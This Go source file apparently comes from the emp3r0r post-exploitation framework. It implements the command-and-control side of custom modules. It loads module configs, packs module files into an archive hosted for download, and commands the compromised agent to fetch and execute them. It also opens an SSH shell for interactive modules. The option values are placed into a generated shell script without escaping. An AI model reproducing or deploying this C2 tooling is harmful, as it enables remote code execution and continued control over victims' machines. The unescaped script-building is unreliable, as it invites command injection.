//go:build linux
// +build linux

package cc


import (
	"encoding/json"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/fatih/color"
	"github.com/google/uuid"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/olekukonko/tablewriter"
)

// ModConfig config.json of a module
// Example
//
//	{
//	    "name": "LES",
//	    "exec": "les.sh",
//	    "platform": "Linux",
//	    "interactive": false,
//	    "author": "jm33-ng",
//	    "date": "2022-01-12",
//	    "comment": "https://github.com/mzet-/linux-exploit-suggester",
//	    "options": {
//	        "args": ["--checksec", "run les.sh with this commandline arg"]
//	    }
//	}
type ModConfig struct {
	Name          string `json:"name"`        // Display as this name
	Exec          string `json:"exec"`        // Run this executable file
	Platform      string `json:"platform"`    // targeting which OS? Linux/Windows
	IsInteractive bool   `json:"interactive"` // whether run as a shell or not, eg. python, bettercap
	Author        string `json:"author"`      // by whom
	Date          string `json:"date"`        // when did you write it
	Comment       string `json:"comment"`     // describe your module in one line
	Path          string `json:"path"`        // where is this module stored? eg. ~/.emp3r0r/modules

	// option: [value, help]
	// eg.
	// "option you see in emp3r0r console": ["a parameter of your module", "describe how to use this parameter"]
	Options map[string][]string `json:"options"`
}

// stores module configs
var ModuleConfigs = make(map[string]ModConfig, 1)

// stores module names
var ModuleNames = []string{}

// moduleCustom run a custom module
func moduleCustom() {
	go func() {
		start_sh := WWWRoot + CurrentMod + ".sh"
		config, exists := ModuleConfigs[CurrentMod]
		if !exists {
			CliPrintError("Config of %s does not exist", CurrentMod)
			return
		}
		for opt, val := range config.Options {
			val[0] = Options[opt].Val
		}

		// most of the time, start.sh is the only file changing
		// and it's very small, so we host it for agents to download
		err = genStartScript(&config, start_sh)
		if err != nil {
			CliPrintError("Generating start.sh: %v", err)
			return
		}
		if config.IsInteractive {
			// empty out start.sh
			// we will run the module as shell
			err = os.WriteFile(start_sh, []byte("echo emp3r0r-interactive-module\n"), 0600)
			if err != nil {
				CliPrintError("write %s: %v", start_sh, err)
				return
			}
		}

		// compress module files
		tarball := WWWRoot + CurrentMod + ".tar.xz"
		CliPrintInfo("Compressing %s with xz...", CurrentMod)
		path := fmt.Sprintf("%s/%s", config.Path, CurrentMod)
		err = util.TarXZ(path, tarball)
		if err != nil {
			CliPrintError("Compressing %s: %v", CurrentMod, err)
			return
		}
		CliPrintInfo("Created %.4fMB archive (%s) for module '%s'",
			float64(util.FileSize(tarball))/1024/1024, tarball, CurrentMod)

		// tell agent to download and execute this module
		checksum := tun.SHA256SumFile(tarball)
		cmd := fmt.Sprintf("%s %s %s", emp3r0r_data.C2CmdCustomModule, CurrentMod, checksum)
		cmd_id := uuid.NewString()
		err = SendCmdToCurrentTarget(cmd, cmd_id)
		if err != nil {
			CliPrintError("Sending command %s to %s: %v", cmd, CurrentTarget.Tag, err)
		}

		// interactive module
		if config.IsInteractive {
			opt, exits := config.Options["args"]
			if !exits {
				config.Options["args"] = []string{"--", "No args"}
			}
			args := opt[0]
			port := strconv.Itoa(util.RandInt(1024, 65535))

			// wait until the module is ready
			for i := 0; i < 10; i++ {
				if strings.Contains(CmdResults[cmd_id], "emp3r0r-interactive-module") {
					break
				}
				time.Sleep(time.Second)
			}
			if !strings.Contains(CmdResults[cmd_id], "emp3r0r-interactive-module") {
				CliPrintError("%s failed to upload", CurrentMod)
				return
			}

			// do it
			err := SSHClient(fmt.Sprintf("%s/%s/%s",
				RuntimeConfig.AgentRoot, CurrentMod, config.Exec),
				args, port, false)
			if err != nil {
				CliPrintError("module %s: %v", config.Name, err)
				return
			}
		}
	}()
}

// Print module meta data
func ModuleDetails(modName string) {
	config, exists := ModuleConfigs[modName]
	if !exists {
		return
	}

	// build table
	tdata := [][]string{}
	tableString := &strings.Builder{}
	table := tablewriter.NewWriter(tableString)
	table.SetHeader([]string{"Name", "Exec", "Platform", "Author", "Date", "Comment"})
	table.SetBorder(true)
	table.SetRowLine(true)
	table.SetAutoWrapText(true)
	table.SetColWidth(20)

	// color
	table.SetHeaderColor(tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor})

	table.SetColumnColor(tablewriter.Colors{tablewriter.FgHiBlueColor},
		tablewriter.Colors{tablewriter.FgBlueColor},
		tablewriter.Colors{tablewriter.FgBlueColor},
		tablewriter.Colors{tablewriter.FgBlueColor},
		tablewriter.Colors{tablewriter.FgBlueColor},
		tablewriter.Colors{tablewriter.FgBlueColor})

	// fill table
	tdata = append(tdata, []string{config.Name, config.Exec, config.Platform, config.Author, config.Date, config.Comment})
	table.AppendBulk(tdata)
	table.Render()
	out := tableString.String()
	AdaptiveTable(out)
	CliPrintInfo("Module details:\n%s", out)
}

// scan custom modules in ModuleDir,
// and update ModuleHelpers, ModuleDocs
func InitModules() {
	if !util.IsExist(WWWRoot) {
		os.MkdirAll(WWWRoot, 0700)
	}

	// get vaccine ready
	if !util.IsExist(UtilsArchive) {
		err = CreateVaccineArchive()
		if err != nil {
			CliPrintWarning("CreateVaccineArchive: %v", err)
		}
	}

	load_mod := func(mod_dir string) {
		// don't bother if module dir not found
		if !util.IsExist(mod_dir) {
			return
		}
		CliPrintInfo("Scanning %s for modules", mod_dir)
		dirs, err := os.ReadDir(mod_dir)
		if err != nil {
			CliPrintError("Failed to scan custom modules: %v", err)
			return
		}
		for _, dir := range dirs {
			if !dir.IsDir() {
				continue
			}
			config_file := fmt.Sprintf("%s/%s/config.json", mod_dir, dir.Name())
			if !util.IsExist(config_file) {
				continue
			}
			config, err := readModCondig(config_file)
			if err != nil {
				CliPrintWarning("Reading config from %s: %v", dir.Name(), err)
				continue
			}

			// module path, eg. ~/.emp3r0r/modules
			config.Path = mod_dir

			ModuleHelpers[config.Name] = moduleCustom
			emp3r0r_data.ModuleComments[config.Name] = config.Comment

			err = updateModuleHelp(config)
			if err != nil {
				CliPrintWarning("Loading config from %s: %v", config.Name, err)
				continue
			}
			ModuleConfigs[config.Name] = *config
			CliPrintInfo("Loaded module %s", strconv.Quote(config.Name))
		}

		// make []string for fuzzysearch
		for name, comment := range emp3r0r_data.ModuleComments {
			ModuleNames = append(ModuleNames, fmt.Sprintf("%s: %s", color.HiBlueString(name), comment))
		}

	}

	// read from every defined module dir
	for _, mod_dir := range ModuleDirs {
		load_mod(mod_dir)
	}

	CliPrintInfo("Loaded %d modules", len(ModuleHelpers))
}

// readModCondig read config.json of a module
func readModCondig(file string) (pconfig *ModConfig, err error) {
	// read JSON
	jsonData, err := os.ReadFile(file)
	if err != nil {
		return nil, fmt.Errorf("Read %s: %v", file, err)
	}

	// parse the json
	var config = ModConfig{}
	err = json.Unmarshal(jsonData, &config)
	if err != nil {
		return nil, fmt.Errorf("failed to unmarshal JSON config: %v", err)
	}
	pconfig = &config
	return
}

// genStartScript read config.json of a module
func genStartScript(config *ModConfig, outfile string) (err error) {
	data := ""
	for opt, val_help := range config.Options {
		data = fmt.Sprintf("%s %s='%s' ", data, opt, val_help[0])
	}
	data = fmt.Sprintf("%s ./%s ", data, config.Exec) // run with environment vars

	// write config.json
	return os.WriteFile(outfile, []byte(data), 0600)
}

func updateModuleHelp(config *ModConfig) error {
	help_map := make(map[string]string)
	for opt, val_help := range config.Options {
		if len(val_help) < 2 {
			return fmt.Errorf("%s config error: %s incomplete", config.Name, opt)
		}
		help_map[opt] = val_help[1]
		emp3r0r_data.ModuleHelp[config.Name] = help_map
	}
	return nil
}
